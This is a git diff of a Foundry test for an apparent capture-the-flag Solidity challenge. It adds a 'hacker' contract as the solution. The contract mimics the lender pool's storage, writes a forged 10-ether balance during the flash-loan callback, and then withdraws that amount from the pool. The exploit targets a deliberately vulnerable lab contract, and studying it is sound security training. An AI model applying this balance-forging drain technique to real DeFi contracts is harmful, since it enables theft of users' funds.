@@ -8,7 +8,10 @@ import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
 import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
 
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 
+//forge test --match-test testChallenge1 -vvvv
 contract Challenge1Test is Test {
     InSecureumLenderPool target; 
     IERC20 token;
@@ -25,7 +28,7 @@ contract Challenge1Test is Test {
         vm.label(address(token), "InSecureumToken");
     }
 
-    function testChallenge() public {        
+    function testChallenge1() public {        
         vm.startPrank(player);
 
         /*//////////////////////////////
@@ -33,16 +36,19 @@ contract Challenge1Test is Test {
         //////////////////////////////*/
 
         //=== this is a sample of flash loan usage
-        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
+        InSecureumLenderPoolHacker hacker = new InSecureumLenderPoolHacker();
+        // FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
 
         target.flashLoan(
-          address(_flashLoanReceiver),
+          address(hacker),
           abi.encodeWithSignature(
-            "receiveFlashLoan(address)", player
+            "receiveFlashLoan(address)", address(hacker)
           )
         );
-        //===
 
+        hacker.withdrawFunds(address(target));
+        
+        //===
         //============================//
 
         vm.stopPrank();
@@ -75,5 +81,25 @@ contract FlashLoandReceiverSample {
 }
 
 // @dev this is the solution
-contract Exploit {
+contract InSecureumLenderPoolHacker {
+    using Address for address;
+    using SafeERC20 for IERC20;
+
+    /// @dev Token contract address to be used for lending.
+    //IERC20 immutable public token;
+    IERC20 public token;
+    /// @dev Internal balances of the pool for each user.
+    mapping(address => uint) public balances;
+
+    // flag to notice contract is on a flashloan
+    bool private _flashLoan;
+
+    function receiveFlashLoan(address _attacker) external {
+        balances[_attacker] = 10 ether;
+    }
+
+    function withdrawFunds(address _contractToHack) external {
+        _contractToHack.call(abi.encodeWithSignature("withdraw(uint256)", 10 ether));
+    }
+
 }
